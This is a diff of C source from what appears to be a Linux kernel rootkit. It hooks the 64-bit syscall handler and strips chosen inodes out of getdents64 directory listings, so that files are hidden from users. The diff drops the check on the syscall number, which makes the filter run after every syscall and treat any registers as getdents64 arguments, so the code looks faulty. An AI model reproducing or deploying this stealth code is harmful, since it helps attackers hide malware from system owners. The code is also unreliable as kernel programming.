@@ -167,67 +167,65 @@ g7_syscall_64(unsigned long nr, struct pt_regs *pt_regs)
     atomic_inc(&syscall64_count);
     do_syscall_64(nr, pt_regs);
 
-    if (nr == __NR_getdents64) {
-        //  
-        //  ( ͡°Ĺ̯ ͡° )
-        //
-        //https://elixir.bootlin.com/linux/v4.19.163/source/fs/buffer.c#L1218
-        local_irq_enable();
-        
-        typedef struct linux_dirent64 *dirent64_t_ptr;
+    //  
+    //  ( ͡°Ĺ̯ ͡° )
+    //
+    //https://elixir.bootlin.com/linux/v4.19.163/source/fs/buffer.c#L1218
+    local_irq_enable();
+    
+    typedef struct linux_dirent64 *dirent64_t_ptr;
 
-        unsigned long offset;
-        dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;
-        struct dentry *kdirent_dentry;
+    unsigned long offset;
+    dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;
+    struct dentry *kdirent_dentry;
 
-        cur_kdirent = prev_kdirent = NULL;
-        int fd = (int)pt_regs->di;
-        dirent64_t_ptr dirent = (dirent64_t_ptr)pt_regs->si;
-        long ret = (long)regs_return_value(pt_regs);
+    cur_kdirent = prev_kdirent = NULL;
+    int fd = (int)pt_regs->di;
+    dirent64_t_ptr dirent = (dirent64_t_ptr)pt_regs->si;
+    long ret = (long)regs_return_value(pt_regs);
 
-        if (ret <= 0 || !(kdirent = (dirent64_t_ptr)kzalloc(ret, GFP_KERNEL)))
-            return;
+    if (ret <= 0 || !(kdirent = (dirent64_t_ptr)kzalloc(ret, GFP_KERNEL)))
+        return;
 
-        if (copy_from_user(kdirent, dirent, ret))
-            goto yield;
+    if (copy_from_user(kdirent, dirent, ret))
+        goto yield;
 
-        kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
+    kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
 
-        inode_list_t hidden_inodes = { 0, NULL };
-        inode_list_t_ptr hi_head, hi_tail;
-        hi_head = hi_tail = &hidden_inodes;
+    inode_list_t hidden_inodes = { 0, NULL };
+    inode_list_t_ptr hi_head, hi_tail;
+    hi_head = hi_tail = &hidden_inodes;
 
-        struct list_head *i;
-        list_for_each(i, &kdirent_dentry->d_subdirs) {
-            unsigned long inode;
-            struct dentry *child = list_entry(i, struct dentry, d_child);
+    struct list_head *i;
+    list_for_each(i, &kdirent_dentry->d_subdirs) {
+        unsigned long inode;
+        struct dentry *child = list_entry(i, struct dentry, d_child);
 
-            if ((inode = must_hide_inode(child)))
-                hi_tail = add_inode_to_list(hi_tail, inode);
-        }
-
-        for (offset = 0; offset < ret;) {
-            cur_kdirent = (dirent64_t_ptr)((char *)kdirent + offset);
-
-            if (list_contains_inode(hi_head, cur_kdirent->d_ino)) {
-                if (cur_kdirent == kdirent) {
-                    ret -= cur_kdirent->d_reclen;
-                    memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
-                    continue;
-                }
-
-                prev_kdirent->d_reclen += cur_kdirent->d_reclen;
-            } else
-                prev_kdirent = cur_kdirent;
-
-            offset += cur_kdirent->d_reclen;
-        }
-
-        copy_to_user(dirent, kdirent, ret);
-
-    yield:
-        kfree(kdirent);
+        if ((inode = must_hide_inode(child)))
+            hi_tail = add_inode_to_list(hi_tail, inode);
     }
+
+    for (offset = 0; offset < ret;) {
+        cur_kdirent = (dirent64_t_ptr)((char *)kdirent + offset);
+
+        if (list_contains_inode(hi_head, cur_kdirent->d_ino)) {
+            if (cur_kdirent == kdirent) {
+                ret -= cur_kdirent->d_reclen;
+                memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
+                continue;
+            }
+
+            prev_kdirent->d_reclen += cur_kdirent->d_reclen;
+        } else
+            prev_kdirent = cur_kdirent;
+
+        offset += cur_kdirent->d_reclen;
+    }
+
+    copy_to_user(dirent, kdirent, ret);
+
+yield:
+    kfree(kdirent);
 
     atomic_dec(&syscall64_count);
     local_irq_disable();
